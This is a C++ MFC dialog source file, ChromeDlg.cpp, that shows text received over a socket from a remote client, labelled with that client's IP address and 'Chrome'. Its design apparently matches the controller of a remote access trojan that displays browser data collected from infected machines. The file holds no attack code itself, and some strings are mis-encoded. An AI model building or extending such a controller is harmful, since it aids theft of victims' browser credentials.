// ChromeDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "ChromeDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CChromeDlg dialog


CChromeDlg::CChromeDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CChromeDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CChromeDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT

	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	m_chrome_text = m_pContext->m_DeCompressionBuffer.GetBuffer(1);

}


void CChromeDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CChromeDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	DDX_Control(pDX,IDC_EDIT_CHROME ,m_edit_chrome);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CChromeDlg, CDialog)
	//{{AFX_MSG_MAP(CChromeDlg)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CChromeDlg message handlers

BOOL CChromeDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
		// ���ñ���
	CString str;
	str.Format("\\\\%s - ����Chrome",m_IPAddress);
	SetWindowText(str);

	m_edit_chrome.SetWindowText(m_chrome_text);
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
